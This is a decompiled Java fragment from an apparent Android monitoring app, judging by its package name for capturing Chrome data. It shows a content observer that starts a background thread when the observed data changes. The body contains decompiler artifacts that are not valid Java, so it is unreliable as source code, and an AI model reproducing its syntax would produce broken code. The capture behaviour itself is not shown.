package com.vvt.capture.chrome.c;

import android.database.ContentObserver;

class c
  extends ContentObserver
{
  private Thread b = null;
  
  public c(b paramb)
  {
    super(null);
  }
  
  public void onChange(boolean paramBoolean)
  {
    Thread localThread = this.b;
    if (localThread == null)
    {
      boolean bool = b.a();
      if (bool) {}
      localThread = new java/lang/Thread;
      d locald = new com/vvt/capture/chrome/c/d;
      locald.<init>(this);
      localThread.<init>(locald);
      this.b = localThread;
      localThread = this.b;
      localThread.start();
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/chrome/MyUncaughtExceptionHandler/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */